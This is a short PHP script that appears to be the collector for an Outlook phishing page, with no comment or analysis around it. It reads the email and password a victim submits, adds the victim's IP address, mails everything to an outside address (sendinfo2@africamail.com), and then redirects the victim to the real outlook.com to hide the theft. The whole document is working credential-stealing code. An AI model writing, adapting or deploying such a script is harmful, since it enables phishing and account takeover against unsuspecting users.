<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || outlook || :------\n";
$message .= "email: ".$_POST['formtext1']."\n";
$message .= "password: ".$_POST['formtext2']."\n";
$message .= "----: || THckingE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="sendinfo2@africamail.com";
$subject = "tare | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://outlook.com");
?>